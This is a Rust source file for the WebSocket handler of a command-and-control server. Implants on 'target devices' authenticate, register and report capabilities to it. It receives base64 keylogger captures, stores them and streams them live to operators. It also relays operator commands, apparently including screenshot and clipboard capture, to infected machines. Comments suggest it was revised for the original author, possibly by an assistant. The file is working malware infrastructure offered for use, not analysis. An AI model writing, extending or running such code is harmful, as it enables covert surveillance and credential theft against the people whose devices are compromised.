// src/ws/implant.rs
//
// Handles connections from implants running on target devices.
// Route mounted at: /ws/implant
//
// Handshake (unchanged from your original protocol):
//   implant → HELLO <ws_key>     server → HELLO_OK | HELLO_FAIL
//   implant → FORMAT json|csv    server → FORMAT_OK | FORMAT_FAIL
//   implant → IDENT <id>|NEW     server → IDENT_OK <device_id> | IDENT_FAIL
//   server  → CMD caps           implant → CMD_OK <cap1>;<cap2>;…
//
// Command loop — new: CMD now includes a correlation id so the frontend
// handler can route responses back to the right browser:
//   server  → CMD <cmd_id> <verb> [args]
//   implant → CMD_OK <cmd_id> [output]
//   implant → CMD_FAIL <cmd_id> [reason]
//   implant → EVENT <type> [data]          (unchanged)

use super::shared::{push_to_frontends, recv_text, send_text};
use crate::state::{AppState, Device, Format};
use axum::{
    Router,
    extract::{
        ConnectInfo, State,
        ws::{Message, WebSocket, WebSocketUpgrade},
    },
    response::IntoResponse,
    routing::get,
};
use std::{net::SocketAddr, time::Instant};
use tokio::sync::mpsc;
use tracing::{info, warn};

pub fn router() -> Router<AppState> {
    Router::new().route("/", get(ws_handler))
}

async fn ws_handler(
    ws: WebSocketUpgrade,
    ConnectInfo(addr): ConnectInfo<SocketAddr>,
    State(state): State<AppState>,
) -> impl IntoResponse {
    ws.on_upgrade(move |socket| handle_implant(socket, addr, state))
}

// ── Keylog flush — identical to your original ─────────────────────────────────

async fn flush_keylog(device_id: &str, state: &AppState) {
    let mut devices = state.devices.write().await;
    let dev = match devices.get_mut(device_id) {
        Some(d) => d,
        None => return,
    };

    if dev.keylog_buf.is_empty() {
        dev.keylog_last_flush = Instant::now();
        return;
    }

    let chunk = std::mem::take(&mut dev.keylog_buf);
    dev.keylog_last_flush = Instant::now();
    drop(devices); // release lock before DB call

    sqlx::query!(
        "INSERT INTO keylog (device_id, data) VALUES (?, ?)",
        device_id,
        chunk
    )
    .execute(&state.db)
    .await
    .ok();

    info!("Flushed keylog for {}", device_id);
}

// ── Main handler ──────────────────────────────────────────────────────────────

async fn handle_implant(mut socket: WebSocket, addr: SocketAddr, state: AppState) {
    info!("New implant connection from {}", addr);

    // ── Stage 1: HELLO ────────────────────────────────────────────────────
    let msg = match recv_text(&mut socket).await {
        Some(m) => m,
        None => {
            warn!("Disconnected before HELLO");
            return;
        }
    };

    let ws_key = match msg.strip_prefix("HELLO ") {
        Some(key) => key.to_string(),
        None => {
            warn!("Bad HELLO from {}: {:?}", addr, msg);
            let _ = send_text(&mut socket, "HELLO_FAIL").await;
            return;
        }
    };

    let program_id = match sqlx::query!("SELECT id FROM programs WHERE ws_key = ? LIMIT 1", ws_key)
        .fetch_optional(&state.db)
        .await
    {
        Ok(Some(row)) => row.id,
        _ => {
            warn!("Invalid ws_key from {}: {}", addr, ws_key);
            let _ = send_text(&mut socket, "HELLO_FAIL").await;
            return;
        }
    };

    if !send_text(&mut socket, "HELLO_OK").await {
        return;
    }

    // ── Stage 2: FORMAT ───────────────────────────────────────────────────
    let msg = match recv_text(&mut socket).await {
        Some(m) => m,
        None => return,
    };

    let format = match msg.strip_prefix("FORMAT ") {
        Some("json") => Format::Json,
        Some("csv") => Format::Csv,
        _ => {
            let _ = send_text(&mut socket, "FORMAT_FAIL").await;
            return;
        }
    };

    if !send_text(&mut socket, "FORMAT_OK").await {
        return;
    }

    // ── Stage 3: IDENT ────────────────────────────────────────────────────
    let msg = match recv_text(&mut socket).await {
        Some(m) => m,
        None => return,
    };

    let requested_id = match msg.strip_prefix("IDENT ") {
        Some(id) => id.to_string(),
        None => {
            let _ = send_text(&mut socket, "IDENT_FAIL").await;
            return;
        }
    };

    let device_id = if requested_id == "NEW" {
        let new_id = uuid::Uuid::new_v4().to_string();
        sqlx::query!(
            "INSERT INTO devices (device_id, program_id, ip_external) VALUES (?, ?, ?)",
            new_id,
            program_id,
            addr.ip().to_string()
        )
        .execute(&state.db)
        .await
        .ok();
        new_id
    } else {
        match sqlx::query!(
            "SELECT device_id FROM devices WHERE device_id = ? AND program_id = ?",
            requested_id,
            program_id
        )
        .fetch_optional(&state.db)
        .await
        {
            Ok(Some(row)) => {
                sqlx::query!(
                    "UPDATE devices SET ip_external = ?, last_seen = NOW() WHERE device_id = ?",
                    addr.ip().to_string(),
                    row.device_id
                )
                .execute(&state.db)
                .await
                .ok();
                row.device_id
            }
            _ => {
                warn!("Unknown device_id from {}: {}", addr, requested_id);
                let _ = send_text(&mut socket, "IDENT_FAIL").await;
                return;
            }
        }
    };

    if !send_text(&mut socket, &format!("IDENT_OK {}", device_id)).await {
        return;
    }
    info!("IDENT_OK device_id={}", device_id);

    // ── Stage 4: CAPS ─────────────────────────────────────────────────────
    if !send_text(&mut socket, "CMD caps").await {
        return;
    }

    let caps_resp = match recv_text(&mut socket).await {
        Some(m) => m,
        None => return,
    };

    let caps: Vec<String> = match caps_resp.strip_prefix("CMD_OK ") {
        Some(list) => list.split(';').map(|s| s.trim().to_string()).collect(),
        None => {
            warn!("Bad caps from {}: {:?}", device_id, caps_resp);
            return;
        }
    };

    info!("Caps for {}: {:?}", device_id, caps);

    // ── Register device in memory ─────────────────────────────────────────
    {
        let mut devices = state.devices.write().await;
        devices.insert(
            device_id.clone(),
            Device {
                id: device_id.clone(),
                ip: addr.ip().to_string(),
                active: true,
                format,
                program_id,
                caps,
                keylog_buf: String::new(),
                keylog_last_flush: Instant::now(),
            },
        );
    }

    // Register outbound channel — frontend handler writes CMD strings here
    let (implant_tx, mut implant_rx) = mpsc::channel::<String>(64);
    state
        .implant_senders
        .write()
        .await
        .insert(device_id.clone(), implant_tx);

    // Notify any open frontend sockets that this device just came online
    push_to_frontends(
        &device_id,
        serde_json::json!({ "type": "status", "connected": true, "device_id": device_id })
            .to_string(),
        &state,
    )
    .await;

    info!("Device {} ready", device_id);

    // ── Command loop ──────────────────────────────────────────────────────
    loop {
        tokio::select! {
            // ── Inbound from implant ──────────────────────────────────────
            frame = socket.recv() => {
                match frame {
                    Some(Ok(Message::Text(text))) => {
                        let text = text.trim().to_string();

                        if text.starts_with("CMD_OK") || text.starts_with("CMD_FAIL") {
                            // Implant replies: "CMD_OK <cmd_id> <data…>"
                            //              or "CMD_FAIL <cmd_id> <reason…>"
                            let mut parts = text.splitn(3, ' ');
                            let status = parts.next().unwrap_or("CMD_FAIL");
                            let cmd_id = parts.next().unwrap_or("").to_string();
                            let data   = parts.next().unwrap_or("").to_string();

                            if !cmd_id.is_empty() {
                                let resolver = state.pending_cmds.write().await.remove(&cmd_id);
                                if let Some(tx) = resolver {
                                    let reply = if status == "CMD_OK" {
                                        format!("CMD_OK {}", data)
                                    } else {
                                        format!("CMD_FAIL {}", data)
                                    };
                                    let _ = tx.send(reply);
                                }
                            }
                        } else if text.starts_with("EVENT ") {
                            handle_event(&device_id, &text, &state).await;
                        } else {
                            warn!("Unknown message from {}: {}", device_id, text);
                        }
                    }
                    Some(Ok(Message::Ping(p))) => {
                        let _ = socket.send(Message::Pong(p)).await;
                    }
                    Some(Ok(Message::Close(_))) | None => break,
                    _ => {}
                }
            }

            // ── Outbound to implant (commands from frontend) ──────────────
            Some(cmd_str) = implant_rx.recv() => {
                if socket.send(Message::Text(cmd_str.into())).await.is_err() {
                    break;
                }
            }
        }
    }

    // ── Disconnect cleanup ────────────────────────────────────────────────
    flush_keylog(&device_id, &state).await;

    if let Some(dev) = state.devices.write().await.get_mut(&device_id) {
        dev.active = false;
    }

    state.implant_senders.write().await.remove(&device_id);

    sqlx::query!(
        "UPDATE devices SET last_seen = NOW() WHERE device_id = ?",
        device_id
    )
    .execute(&state.db)
    .await
    .ok();

    push_to_frontends(
        &device_id,
        serde_json::json!({ "type": "status", "connected": false, "device_id": device_id })
            .to_string(),
        &state,
    )
    .await;

    info!("Device disconnected: {}", device_id);
}

// ── EVENT handler — identical to your original, plus push_to_frontends ────────

async fn handle_event(device_id: &str, raw: &str, state: &AppState) {
    let mut parts = raw.splitn(3, ' ');
    let _ = parts.next(); // "EVENT"
    let event_type = match parts.next() {
        Some(t) => t,
        None => return,
    };
    let data = parts.next().unwrap_or("");

    match event_type {
        "keylog" => {
            let text = match base64::decode(data)
                .ok()
                .and_then(|b| String::from_utf8(b).ok())
            {
                Some(t) => t,
                None => {
                    warn!("Bad keylog b64 from {}", device_id);
                    return;
                }
            };

            let should_flush = {
                let mut devices = state.devices.write().await;
                if let Some(dev) = devices.get_mut(device_id) {
                    dev.keylog_buf.push_str(&text);
                    dev.should_flush_keylog()
                } else {
                    false
                }
            };

            if should_flush {
                flush_keylog(device_id, state).await;
            }

            push_to_frontends(
                device_id,
                serde_json::json!({ "type": "event", "event": "keylog", "data": text }).to_string(),
                state,
            )
            .await;
        }

        "alert" => {
            let mut fields = data.splitn(2, ';');
            let level = fields.next().unwrap_or("low");
            let message = fields.next().unwrap_or("");
            let level = match level {
                "low" | "medium" | "high" => level,
                _ => "low",
            };

            warn!("ALERT [{}] from {}: {}", level, device_id, message);

            sqlx::query!(
                "INSERT INTO events (device_id, level, message) VALUES (?, ?, ?)",
                device_id,
                level,
                message
            )
            .execute(&state.db)
            .await
            .ok();

            push_to_frontends(
                device_id,
                serde_json::json!({
                    "type": "event", "event": "alert",
                    "level": level, "message": message
                })
                .to_string(),
                state,
            )
            .await;
        }

        "screenshot" | "clipboard" => {
            warn!(
                "Unexpected push event '{}' from {} — use CMD instead",
                event_type, device_id
            );
        }

        other => {
            warn!("Unknown event '{}' from {}", other, device_id);
        }
    }
}
